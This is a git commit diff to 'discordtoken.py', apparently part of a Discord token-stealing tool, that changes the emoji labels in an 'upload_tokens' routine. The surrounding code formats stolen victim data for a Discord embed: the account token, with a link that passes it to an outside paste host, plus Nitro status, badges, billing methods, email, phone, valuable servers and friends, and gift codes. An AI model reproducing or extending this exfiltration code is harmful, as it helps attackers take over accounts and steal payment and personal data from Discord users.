748fd2a576265c4ee4d2eae9298480d82411ab3f
READDONE313 <98390001+READDONE313@users.noreply.github.com>
2023-05-07 12:14:29 +0000

    Update discordtoken.py

--- src/components/discordtoken.py
+++ src/components/discordtoken.py
@@ -342,25 +342,25 @@ class upload_tokens:
             embed = Embed(title=f"{username} ({user_id})", color=0x000000)
             embed.set_thumbnail(url=avatar)
 
-            embed.add_field(name="🗒Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
-            embed.add_field(name="💎Nitro:", value=f"{nitro}", inline=True)
-            embed.add_field(name="🏷Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
-            embed.add_field(name="💳Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
+            embed.add_field(name="🔑 Token:", value=f"```{token}```\n[Click to copy!](https://paste-pgpj.onrender.com/?p={token})\n\u200b", inline=False)
+            embed.add_field(name="🌀 Nitro:", value=f"{nitro}", inline=True)
+            embed.add_field(name="🔖 Badges:", value=f"{badges if badges != '' else 'None'}", inline=True)
+            embed.add_field(name="💸 Billing:", value=f"{payment_methods if payment_methods != '' else 'None'}", inline=True)
 
 
-            embed.add_field(name="📨Email:", value=f"{email if email != None else 'None'}", inline=True)
-            embed.add_field(name="📞Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    
+            embed.add_field(name="📨 Email:", value=f"{email if email != None else 'None'}", inline=True)
+            embed.add_field(name="📱 Phone:", value=f"{phone if phone != None else 'None'}", inline=True)    
 
 
             if hq_guilds != None:
-                embed.add_field(name="🧷HQ Guilds:", value=hq_guilds, inline=False)
+                embed.add_field(name="🔗 HQ Guilds:", value=hq_guilds, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
            
             if hq_friends != None:
-                embed.add_field(name="🧷HQ Friends:", value=hq_friends, inline=False)
+                embed.add_field(name="🔗 HQ Friends:", value=hq_friends, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
             if codes != None:
-                embed.add_field(name="🎁Gift Codes:", value=codes, inline=False)
+                embed.add_field(name="🎁 Gift Codes:", value=codes, inline=False)
                 embed.add_field(name="\u200b", value="\u200b", inline=False)
 
             embed.set_footer(text="created by: readdone#9772")
